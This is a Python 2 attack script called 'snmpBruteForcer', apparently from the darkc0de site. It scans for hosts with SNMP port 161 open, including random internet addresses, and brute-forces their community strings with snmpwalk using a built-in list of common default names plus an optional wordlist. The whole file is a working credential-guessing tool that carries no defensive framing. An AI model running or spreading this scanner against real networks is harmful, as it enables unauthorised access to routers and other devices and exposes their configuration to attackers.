#!usr/bin/python
#Uses nmap to check if snmp port is open then uses snmpwalk to try and bruteforce
#the community name.

#Required: nmap and snmpwalk 

#Changelog: added iprange, single scans and threading for random scans
#Changelog: added the ability to add your own wordlist, it will add to 
#the ones given and erase the duplicates

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import time, StringIO, commands, sys, re, threading, sets

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

def title():
	print "\n\t   d3hydr8[at]gmail[dot]com snmpBruteForcer v1.2"
	print "\t--------------------------------------------------\n"
	
def scan(option):
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 '+option+' -p 161 | grep open -B 3')[1]).read()
	if re.search("command not found",nmap.lower()):
		print "\n[-] nmap not installed!!!\n"
		sys.exit(1)
	else:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", nmap)
		if ipaddr:    		
			return ipaddr

def brute(ip):
	print "\n[+] Attempting BruteForce:",ip
	try:
		for n in names:
			response = StringIO.StringIO(commands.getstatusoutput('snmpwalk '+ip+" "+n)[1]).readlines()
			if re.search("command not found",response[0].lower()):
				print "\n[-] snmpwalk not installed!!!\n"
				sys.exit(1)
			else:
				if verbose ==1:
					print "\t{- Trying:",n
				if len(response) > 1:
					print "\n\tSuccess:",ip,"Community Name:",n
					print "\n\tTry: snmpwalk",ip,n,"\n"
	except(), msg:
		#print "Error:",msg
		pass

class Worker(threading.Thread):
	def run(self):
		ipaddr = scan("-iR 1")
		if ipaddr != None:
			for ip in ipaddr:
				brute(ip)
				
if len(sys.argv) <= 2:
	title()
	print "Usage: ./snmp_random.py <option> \n"
	print "Example: ./snmpbrute.py -iprange 192.168.1-100.1-255 -verbose\n"
	print "[options]"
	print "   -s/single <ip>: Bruteforce single ip"
	print "   -i/-iprange <ip_range>: Scans ip range for snmp to brute force"
	print "   -r/-random <how many to scan>: Will scan random ip's for snmp to brute force"
	print "   -l/-list <wordlist file>: Add your own wordlist"
	print "   -v/-verbose : Verbose Mode\n"
	sys.exit(1)

#Add more community names here.
names = ["1234","2read","4changes","CISCO","IBM","OrigEquipMfr","SNMP","SUN","access","admin","agent","all","cisco"
		,"community","default","enable","field","guest","hello","ibm","manager","mngt","monitor","netman","network"
		,"none","openview","pass","password","passwd","private","proxy","public","read","read-only","read-write"
		,"root","router","secret","security","snmp","snmpd","solaris","sun","switch","system","tech","test"
		,"world","write"]
		
for arg in sys.argv[1:]:
	if arg.lower() == "-s" or arg.lower() == "-single":
		ipaddr = sys.argv[int(sys.argv[1:].index(arg))+2]
		mode = "Single IP"
	if arg.lower() == "-i" or arg.lower() == "-iprange":
		iprange = sys.argv[int(sys.argv[1:].index(arg))+2]
		mode = "Ip-Range"
	if arg.lower() == "-r" or arg.lower() == "-random":
		total = sys.argv[int(sys.argv[1:].index(arg))+2]
		mode = "Random"
	if arg.lower() == "-l" or arg.lower() == "-list":
		wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
title()	
try:
	print "[+] Wordlist:",wordlist,"loading"
  	words = open(wordlist, "r").readlines()
	print "[+] Loaded:",len(words),"names"
	names = list(sets.Set(words+names))
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)
except(NameError):
	pass
	
print "[+] Mode:",mode
if mode == "Random":
	if total.isdigit() == False:
		print "\n[!] How many ips to scan: must be a number\n"
		sys.exit(1)
	else:
		print "[+] Total:",total
if mode == "Ip-Range":
	print "[+] Range:",iprange
try:
	if verbose ==1:
		print "[+] Verbose Mode On"
except(NameError):
	verbose = 0
	print "[-] Verbose Mode Off"
print "[+] Names Loaded:",len(names)
print "[+] Started:",timer(),"\n"

if mode == "Random":
	for i in range(int(total)):
		print "[+] Scanning:",i+1,"of",total
		work = Worker()
		work.start()
		time.sleep(1)
if mode == "Single IP":
	brute(ipaddr)
if mode == "Ip-Range":
	print "[+] Scanning:",iprange
	ips = scan(iprange)
	if ips != None:
		print "[+] Found:",len(ips)
		for ip in ips:
			brute(ip)
	else:
		print "\n[!] No SNMP Open"
	
print "\n[-] Done -",timer(),"\n"

